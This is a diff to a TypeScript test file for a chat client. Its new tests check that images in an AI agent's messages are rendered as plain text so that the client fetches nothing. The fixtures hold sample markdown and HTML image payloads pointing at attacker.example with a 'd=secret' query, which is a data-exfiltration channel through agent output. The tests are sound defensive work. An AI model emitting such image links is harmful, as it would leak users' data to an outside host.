@@ -19,6 +19,7 @@ import {
   kinChatScreenState,
   kinChatStatusLine,
   kinDayLabel,
+  kinBodyMarkdown,
   kinImageSource,
   kinImageText,
   kinLinkToOpen,
@@ -488,6 +489,24 @@ describe("kinLinkToOpen", () => {
 describe("message images", () => {
   // `![](…?d=<data>)` in an agent's message would leak data if the chat fetched it on open.
   const image = { href: "https://attacker.example/p.png?d=secret", alt: "status", title: null };
+
+  it.each([
+    [
+      "an inline image",
+      "Done ![status](https://attacker.example/p.png?d=secret) ok",
+      "Done Image: status ok",
+    ],
+    ["an image without alt", "![](https://attacker.example/p.png)", "Image"],
+    [
+      "a reference image",
+      "![x][1]\n\n[1]: https://attacker.example/p.png",
+      "Image: x\n\n[1]: https://attacker.example/p.png",
+    ],
+    ["an HTML image", 'a <IMG src="https://attacker.example/p.png"> b', "a Image b"],
+    ["a plain link", "[docs](https://example.com)", "[docs](https://example.com)"],
+  ])("renders %s as text before parsing", (_name, body, rendered) => {
+    expect(kinBodyMarkdown(body)).toBe(rendered);
+  });
 
   it("resolves no source, so the renderer requests nothing", () => {
     expect(kinImageSource()).toEqual({ uri: "" });
